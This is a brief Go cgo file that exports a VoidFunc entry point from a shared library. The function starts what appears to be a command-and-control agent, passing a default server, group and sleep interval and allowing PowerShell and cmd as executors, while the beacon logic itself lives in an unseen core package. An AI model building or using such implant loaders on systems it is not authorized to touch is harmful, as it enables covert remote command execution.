package main

import "C"
import (
	"../core"
)

//export VoidFunc
func VoidFunc() {
	core.Core(core.DefaultServer, core.DefaultGroup, core.DefaultSleep, []string{"psh","cmd"}, false)
}

func main() {}